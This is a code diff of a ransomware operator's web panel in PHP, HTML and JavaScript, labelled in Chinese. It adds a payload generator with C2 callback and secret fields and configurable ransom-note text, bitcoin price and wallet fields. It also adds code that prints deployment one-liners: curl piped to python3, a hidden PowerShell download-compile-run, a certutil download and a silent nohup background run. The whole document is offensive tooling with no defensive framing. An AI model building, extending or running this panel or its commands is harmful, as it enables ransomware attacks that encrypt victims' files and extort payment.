@@ -65,25 +65,39 @@ $csrf = csrf_token();
 <!-- 载荷生成器 -->
 <section class="panel" id="panel-gen">
 <h2><i class="fas fa-virus"></i> 载荷生成器</h2>
-<div class="gen-grid">
-  <div class="gen-card" data-platform="win">
-    <i class="fab fa-windows"></i><h3>Windows</h3><p>C# / .NET — AES+RSA</p>
-    <button class="btn btn-red" onclick="genPayload('win')"><i class="fas fa-download"></i> 生成</button>
-  </div>
-  <div class="gen-card" data-platform="linux">
-    <i class="fab fa-linux"></i><h3>Linux</h3><p>Python3 — AES+RSA</p>
-    <button class="btn btn-red" onclick="genPayload('linux')"><i class="fas fa-download"></i> 生成</button>
-  </div>
-  <div class="gen-card" data-platform="macos">
-    <i class="fab fa-apple"></i><h3>macOS</h3><p>Python3 — AES+RSA</p>
-    <button class="btn btn-red" onclick="genPayload('macos')"><i class="fas fa-download"></i> 生成</button>
-  </div>
-</div>
-<div class="gen-opts">
-  <div class="field"><label>回连地址</label><input type="text" id="c2url" value="<?=h($GLOBALS['_ENV']['DB_HOST'] ?? 'http://127.0.0.1')?>/handshake.php" placeholder="http://yourserver/handshake.php"></div>
+
+<div class="gen-opts" style="grid-template-columns:1fr 1fr 1fr;margin-bottom:20px">
+  <div class="field"><label>回连地址 (C2)</label><input type="text" id="c2url" value="<?=h($GLOBALS['_ENV']['DB_HOST'] ?? 'http://127.0.0.1')?>/handshake.php"></div>
   <div class="field"><label>握手密钥</label><input type="text" id="gensecret" value="jasmin@123"></div>
+  <div class="field"><label>目标系统</label>
+    <select id="gen-platform" style="width:100%;padding:9px 12px;background:var(--bg);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:.85rem">
+      <option value="win">🖥️ Windows (C# / .NET)</option>
+      <option value="linux">🐧 Linux (Python3)</option>
+      <option value="macos">🍎 macOS (Python3)</option>
+    </select>
+  </div>
 </div>
-<div id="gen-result" class="gen-result"></div>
+
+<h3 style="color:var(--accent2);font-size:.9rem;margin-bottom:12px"><i class="fas fa-scroll"></i> 勒索信配置</h3>
+<div class="gen-opts" style="grid-template-columns:1fr 1fr">
+  <div class="field"><label>勒索标题</label><input type="text" id="ransom-title" value="YOUR FILES HAVE BEEN ENCRYPTED"></div>
+  <div class="field"><label>联系方式</label><input type="text" id="ransom-contact" value="Contact: jasmin@protonmail.com" placeholder="邮箱/Telegram/Bitcoin地址"></div>
+</div>
+<div class="field" style="margin-bottom:14px"><label>勒索信正文 (支持多行)</label>
+<textarea id="ransom-body" rows="4" style="width:100%;padding:10px 14px;background:var(--bg);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:.84rem;resize:vertical;font-family:monospace">所有文件已使用 AES-256 + RSA-2048 军事级加密。
+每个文件拥有独立密钥，由RSA公钥保护。
+不要重命名/删除 .jasmin 文件，不要用第三方软件解密。
+联系我们获取私钥以解密文件。</textarea>
+</div>
+<div class="gen-opts" style="grid-template-columns:1fr 1fr">
+  <div class="field"><label>赎金金额</label><input type="text" id="ransom-price" value="0.5 BTC" placeholder="如: 0.5 BTC / $5000 USDT"></div>
+  <div class="field"><label>支付地址</label><input type="text" id="ransom-wallet" value="" placeholder="BTC/ETH/USDT地址"></div>
+</div>
+
+<div style="display:flex;gap:10px;margin-top:16px">
+  <button class="btn btn-red" onclick="genPayload()"><i class="fas fa-cog"></i> 生成载荷</button>
+</div>
+<div id="gen-result" class="gen-result" style="margin-top:16px"></div>
 </section>
 
 <!-- Victims -->
@@ -177,19 +191,50 @@ function showTab(t){
   document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
   event.target.closest('.nav-item').classList.add('active');
 }
-function genPayload(p){
+function genPayload(){
+  var p=document.getElementById('gen-platform').value;
   var c2=document.getElementById('c2url').value;
   var sec=document.getElementById('gensecret').value;
   var res=document.getElementById('gen-result');
   res.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> 正在生成 '+p+' 载荷...</span>';
   var fd=new FormData();
   fd.append('platform',p);fd.append('c2_url',c2);fd.append('secret',sec);fd.append('csrf_token','<?=$csrf?>');
+  fd.append('ransom_title',document.getElementById('ransom-title').value);
+  fd.append('ransom_contact',document.getElementById('ransom-contact').value);
+  fd.append('ransom_body',document.getElementById('ransom-body').value);
+  fd.append('ransom_price',document.getElementById('ransom-price').value);
+  fd.append('ransom_wallet',document.getElementById('ransom-wallet').value);
   fetch('generate.php',{method:'POST',body:fd})
   .then(r=>r.json()).then(d=>{
-    if(d.ok){
-      res.innerHTML='<div class="gen-ok"><i class="fas fa-check-circle"></i> <b>'+d.platform+'</b> 载荷已就绪: <a href="payloads/'+d.file+'" download>'+d.file+'</a> ('+d.size+' bytes)</div>';
-    }else{res.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> '+d.msg+'</div>';}
-  }).catch(e=>{res.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> Error: '+e+'</div>';});
+    if(!d.ok){res.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> '+d.msg+'</div>';return;}
+    var pname={'win':'Windows','linux':'Linux','macos':'macOS'}[p]||p;
+    var dl='payloads/'+d.file;
+    var html='<div class="gen-ok">';
+    html+='<i class="fas fa-check-circle"></i> <b>'+pname+'</b> 载荷已就绪: <a href="'+dl+'" download>'+d.file+'</a> ('+d.size+' B)';
+    html+='<div style="margin-top:16px;padding:14px;background:var(--bg);border:1px solid var(--border);border-radius:8px">';
+    html+='<h4 style="color:var(--accent2);margin-bottom:10px"><i class="fas fa-terminal"></i> 一键部署命令</h4>';
+    if(p==='linux'||p==='macos'){
+      var rurl=location.origin+'/'+dl;
+      html+='<pre class="dt-code" style="margin:0">'+
+        '# 方式1: curl 直接运行\n'+
+        'curl -sL '+rurl+' | python3\n\n'+
+        '# 方式2: wget 下载后运行\n'+
+        'wget -q '+rurl+' -O /tmp/.j && python3 /tmp/.j && rm -f /tmp/.j\n\n'+
+        '# 方式3: 后台静默运行\n'+
+        'nohup python3 -c \"$(curl -sL '+rurl+')\" > /dev/null 2>&1 &'+
+        '</pre>';
+    }else{
+      html+='<pre class="dt-code" style="margin:0">'+
+        ':: 方式1: PowerShell 下载运行\n'+
+        'powershell -w hidden -c \"IWR -Uri \''+location.origin+'/'+dl+'\' -OutFile $env:TEMP\\\\j.cs; '+
+        'cd $env:TEMP; csc /target:winexe /out:j.exe j.cs; Start-Process j.exe\"\n\n'+
+        ':: 方式2: certutil 下载\n'+
+        'certutil -urlcache -split -f '+location.origin+'/'+dl+' %TEMP%\\\\j.cs && csc /target:winexe /out:%TEMP%\\\\j.exe %TEMP%\\\\j.cs && %TEMP%\\\\j.exe'+
+        '</pre>';
+    }
+    html+='</div></div>';
+    res.innerHTML=html;
+  }).catch(e=>{res.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> '+e+'</div>';});
 }
 </script>
 </body>
